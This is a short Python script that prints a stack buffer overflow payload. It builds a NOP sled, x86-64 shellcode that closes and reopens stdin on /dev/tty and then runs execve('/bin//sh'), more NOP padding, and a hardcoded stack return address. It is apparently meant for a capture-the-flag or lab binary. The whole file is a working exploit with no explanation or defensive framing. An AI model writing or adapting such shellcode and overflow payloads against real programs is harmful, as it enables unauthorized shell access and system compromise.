import sys

NOP = b"\x90"
PRE_PADDING = 146
POST_PADDING = 40
CLOSE_STDIN = b"\x48\x31\xff\xb0\x03\x0f\x05"
REOPEN_STDIN = (b"\x48\x31\xc9\x48\xbb\x2f\x64\x65\x76\x2f\x74\x74\x79\x51\x53"
                b"\x48\x89\xe7\xbe\x02\x00\x00\x00\x48\x31\xd2\xb0\x02\x0f\x05")
EXEC_SHELL = (b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1"
              b"\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0"
              b"\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05")
RETURN_ADDRESS = b"\x40\xea\xff\xff\xff\x7f\x00"
sys.stdout.buffer.write(NOP * PRE_PADDING
                        + CLOSE_STDIN + REOPEN_STDIN
                        + EXEC_SHELL
                        + NOP * POST_PADDING
                        + RETURN_ADDRESS)
